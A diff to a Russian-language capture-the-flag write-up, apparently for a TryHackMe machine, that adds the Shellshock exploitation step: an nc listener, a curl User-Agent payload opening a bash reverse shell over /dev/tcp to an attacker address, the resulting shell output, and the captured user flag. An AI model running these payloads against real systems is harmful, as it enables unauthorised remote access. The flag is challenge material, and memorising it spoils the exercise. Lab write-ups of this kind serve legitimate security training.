@@ -82,7 +82,7 @@ uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 
 /admin - выдает просто белый экран, дальше;
 
-/backup - файл с приватным ключом, зашифрованным паролем (я его расшифровал, но применить по ходу эксплуатации так и не довелось, хотя расшифровал, пробовал применить к 
+/backup - файл с приватным ключом, зашифрованный паролем (я его расшифровал, но применить по ходу эксплуатации так и не довелось, хотя расшифровал, пробовал применить к 
 существующим учетным записям);
 
 /secret - фотография черепашки, ничего интересного, дальше;
@@ -96,9 +96,51 @@ uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 Высвечивается надпись Hello World!. Это прямой указатель на уязвимость shellshock. 
 Захожу на Payloads All The Things, ввожу в поиске shellshock и копирую пэйлоад `curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" `. Нужно его адаптировать под себя и применить:
 
-Ввожу
+Открываю еще одно окно терминала, ввожу `nc -lnvp 4444` для прослушки входящих подключений по 4444 порту;
 
-**Флаг пользователя:** `flag`
+В другом ввожу адаптированный под себя эксплойт `curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.132.101/4444 0>&1" "https://10.82.184.147/cgi-bin/test.cgi"`;
+
+В окне прослушивания открывается reverse shell. Для начала необходимо узнать, где я вообще оказался, и какая версия операционной системы здесь
+
+```
+www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ubuntu:/usr/lib/cgi-bin$ uname -r
+uname -r
+3.13.0-32-generic
+www-data@ubuntu:/usr/lib/cgi-bin$ cat /etc/os-release
+cat /etc/os-release
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+```
+
+Версия целевой машины - "Ubuntu 14.04.1 LTS". Оставляю это на потом, после первичного доступа пробую искать флаг пользователя
+```
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls
+ls
+ryan
+www-data@ubuntu:/home$ cd ryan
+cd ryan
+www-data@ubuntu:/home/ryan$ ls
+ls
+user.txt
+www-data@ubuntu:/home/ryan$ cat user.txt
+cat user.txt
+THM{Sh3llSh0ck_r0ckz}
+```
+
+**Флаг пользователя:** `THM{Sh3llSh0ck_r0ckz}`
 
 ## 3. Повышение привилегий
 
